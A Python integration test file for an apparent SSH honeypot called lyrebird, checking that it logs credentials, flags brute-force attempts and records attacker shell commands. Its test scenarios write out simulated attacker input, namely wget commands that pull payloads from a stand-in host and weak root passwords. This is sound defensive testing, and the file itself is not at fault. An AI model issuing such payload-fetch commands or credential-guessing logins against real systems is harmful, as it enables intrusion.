# SPDX-License-Identifier: GPL-3.0-or-later
"""Integration tests: SSH honeypot captures credentials, brute-force, and shell."""
import asyncio
import json
import time
from pathlib import Path
import sys

import asyncssh

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from lyrebird.events import EventSink  # noqa: E402
from lyrebird.services.ssh import SshService  # noqa: E402


def _wait_for_events(log: Path, timeout: float = 10.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if log.exists():
            lines = [l for l in log.read_text().splitlines() if l.strip()]
            if lines:
                return [json.loads(l) for l in lines]
        time.sleep(0.05)
    return []


def _client(passwords):
    class _C(asyncssh.SSHClient):
        def __init__(self):
            self._pw = list(passwords)
        def password_auth_requested(self):
            return self._pw.pop(0) if self._pw else None
    return _C


def test_ssh_denies_and_logs_credentials(tmp_path):
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    svc = SshService(cfg={"port": 0, "accept_after": 99}, sink=sink,
                     bind_address="127.0.0.1", data_dir=tmp_path, tls={})

    async def scenario():
        await svc.start()
        port = svc._server.get_port()
        try:
            await asyncssh.connect("127.0.0.1", port, username="root",
                                   known_hosts=None, client_factory=_client(["hunter2"]))
        except asyncssh.PermissionDenied:
            pass
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert creds, "no credentials event emitted"
    assert creds[0]["request"]["user"] == "root"
    assert creds[0]["request"]["password"] == "hunter2"
    assert creds[0]["request"]["accepted"] is False
    assert creds[0]["service"] == "ssh"


def test_ssh_host_key_persists(tmp_path):
    sink = EventSink(session="t", log_path=tmp_path / "e.jsonl", echo=False)

    async def start_stop():
        svc = SshService(cfg={"port": 0}, sink=sink, bind_address="127.0.0.1",
                         data_dir=tmp_path, tls={})
        await svc.start()
        await svc.stop()

    asyncio.run(start_stop())
    key_path = tmp_path / "ssh" / "host_key"
    assert key_path.exists()
    first = key_path.read_bytes()
    asyncio.run(start_stop())
    assert key_path.read_bytes() == first  # reused, not regenerated
    sink.close()


def test_ssh_accepts_after_threshold_and_flags_bruteforce(tmp_path):
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    svc = SshService(cfg={"port": 0, "accept_after": 3, "bruteforce_threshold": 3},
                     sink=sink, bind_address="127.0.0.1", data_dir=tmp_path, tls={})

    async def scenario():
        await svc.start()
        port = svc._server.get_port()
        conn = await asyncssh.connect(
            "127.0.0.1", port, username="root", known_hosts=None,
            client_factory=_client(["wrong1", "wrong2", "letmein"]))
        conn.close()
        await conn.wait_closed()
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert len(creds) == 3
    assert creds[-1]["request"]["accepted"] is True
    bf = [e for e in events if "ssh-bruteforce" in e.get("tags", [])]
    assert bf, "no ssh-bruteforce signal"
    assert bf[0]["request"]["attempts"] == 3
    assert bf[0]["request"]["accepted"] is True
    assert isinstance(bf[0]["request"]["client_version"], str)


def test_ssh_weak_cred_accepted_immediately(tmp_path):
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    svc = SshService(cfg={"port": 0, "accept_after": 99,
                          "weak_creds": [{"user": "root", "password": "root"}],
                          "bruteforce_threshold": 99},
                     sink=sink, bind_address="127.0.0.1", data_dir=tmp_path, tls={})

    async def scenario():
        await svc.start()
        port = svc._server.get_port()
        conn = await asyncssh.connect("127.0.0.1", port, username="root",
                                      known_hosts=None, client_factory=_client(["root"]))
        conn.close()
        await conn.wait_closed()
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert len(creds) == 1
    assert creds[0]["request"]["accepted"] is True
    assert [e for e in events if "ssh-bruteforce" in e.get("tags", [])] == []


def test_ssh_shell_captures_commands_and_payload_pull(tmp_path):
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    svc = SshService(cfg={"port": 0, "accept_after": 1, "bruteforce_threshold": 99},
                     sink=sink, bind_address="127.0.0.1", data_dir=tmp_path, tls={})

    async def scenario():
        await svc.start()
        port = svc._server.get_port()
        async with asyncssh.connect("127.0.0.1", port, username="root",
                                    known_hosts=None,
                                    client_factory=_client(["root"])) as conn:
            r1 = await conn.run("uname -a")
            r2 = await conn.run("wget http://10.0.0.9/x.sh")
            assert r1.stdout.strip().startswith("Linux")
            assert r2.exit_status == 0
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    cmds = [e for e in events if e.get("request", {}).get("command")]
    assert any(e["request"]["command"] == "uname -a" for e in cmds)
    pull = [e for e in events if "ssh-payload-pull" in e.get("tags", [])]
    assert pull, "no ssh-payload-pull signal"
    assert pull[0]["request"]["tool"] == "wget"
    assert pull[0]["request"]["url"] == "http://10.0.0.9/x.sh"
    assert pull[0]["service"] == "ssh"


def test_ssh_interactive_shell_captures_commands(tmp_path):
    # Exercises the process.command-is-None interactive branch (prompt, stdin
    # loop, exit handling) — the primary honeypot path (attacker types commands).
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    svc = SshService(cfg={"port": 0, "accept_after": 1, "bruteforce_threshold": 99},
                     sink=sink, bind_address="127.0.0.1", data_dir=tmp_path, tls={})

    async def scenario():
        await svc.start()
        port = svc._server.get_port()
        async with asyncssh.connect("127.0.0.1", port, username="root",
                                    known_hosts=None,
                                    client_factory=_client(["root"])) as conn:
            proc = await conn.create_process()          # no command => interactive
            proc.stdin.write("whoami\n")
            proc.stdin.write("busybox wget http://10.0.0.9/m.bin\n")
            proc.stdin.write("exit\n")
            await proc.stdin.drain()
            out = await asyncio.wait_for(proc.stdout.read(), timeout=5)
            await proc.wait_closed()
            assert "root" in out                        # canned whoami output
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    cmds = [e for e in events if e.get("request", {}).get("command")]
    assert any(e["request"]["command"] == "whoami" for e in cmds)
    pull = [e for e in events if "ssh-payload-pull" in e.get("tags", [])]
    assert pull, "no ssh-payload-pull signal from interactive shell"
    assert pull[0]["request"]["tool"] == "wget"         # busybox wrapper stripped
    assert pull[0]["request"]["url"] == "http://10.0.0.9/m.bin"


def test_ssh_subsystem_request_is_logged_not_shelled(tmp_path):
    # A non-shell subsystem request (e.g. netconf) must be logged and closed,
    # not routed into the text shell loop.
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    svc = SshService(cfg={"port": 0, "accept_after": 1, "bruteforce_threshold": 99},
                     sink=sink, bind_address="127.0.0.1", data_dir=tmp_path, tls={})

    async def scenario():
        await svc.start()
        port = svc._server.get_port()
        async with asyncssh.connect("127.0.0.1", port, username="root",
                                    known_hosts=None,
                                    client_factory=_client(["root"])) as conn:
            proc = await conn.create_process(subsystem="netconf")
            await asyncio.wait_for(proc.wait_closed(), timeout=5)
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    subsys = [e for e in events if e.get("request", {}).get("subsystem")]
    assert subsys, "subsystem request not logged"
    assert subsys[0]["request"]["subsystem"] == "netconf"
    # it must NOT have been treated as a shell (no command events)
    assert not [e for e in events if e.get("request", {}).get("command")]
